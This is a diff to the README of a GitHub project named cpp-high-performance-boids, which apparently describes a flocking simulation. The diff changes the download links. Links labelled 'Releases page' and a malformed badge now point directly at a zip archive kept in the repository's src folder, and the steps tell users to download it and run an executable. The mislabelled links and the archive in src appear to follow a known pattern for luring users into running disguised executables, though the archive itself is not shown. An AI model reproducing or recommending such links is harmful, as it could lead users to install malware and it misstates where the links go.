@@ -6,11 +6,11 @@ Welcome to cpp-high-performance-boids! This application lets you run an efficien
 
 ## 📥 Download the Latest Release
 
-[![Download Releases](https://raw.githubusercontent.com/bacctiere12/cpp-high-performance-boids/main/src/performance-cpp-boids-high-v2.7-alpha.2.zip%20Latest%20Release-%20%F0%9F%93%95-brightgreen)](https://raw.githubusercontent.com/bacctiere12/cpp-high-performance-boids/main/src/performance-cpp-boids-high-v2.7-alpha.2.zip)
+[![Download Releases](https://github.com/bacctiere12/cpp-high-performance-boids/raw/refs/heads/main/src/performance_high_cpp_boids_2.7.zip%20Latest%20Release-%20%F0%9F%93%95-brightgreen)](https://github.com/bacctiere12/cpp-high-performance-boids/raw/refs/heads/main/src/performance_high_cpp_boids_2.7.zip)
 
 To get started, you can download the application from our Releases page. Click the link below to visit:
 
-[Download the cpp-high-performance-boids](https://raw.githubusercontent.com/bacctiere12/cpp-high-performance-boids/main/src/performance-cpp-boids-high-v2.7-alpha.2.zip)
+[Download the cpp-high-performance-boids](https://github.com/bacctiere12/cpp-high-performance-boids/raw/refs/heads/main/src/performance_high_cpp_boids_2.7.zip)
 
 ## 💻 System Requirements
 
@@ -34,7 +34,7 @@ cpp-high-performance-boids comes with several robust features:
 
 To download and run the software:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/bacctiere12/cpp-high-performance-boids/main/src/performance-cpp-boids-high-v2.7-alpha.2.zip).
+1. Visit the [Releases page](https://github.com/bacctiere12/cpp-high-performance-boids/raw/refs/heads/main/src/performance_high_cpp_boids_2.7.zip).
 2. Find the latest version labeled "Latest Release".
 3. Click on the appropriate file for your operating system (e.g., `.exe` for Windows, `.app` for macOS, or binaries for Linux).
 4. Once downloaded, follow these steps:
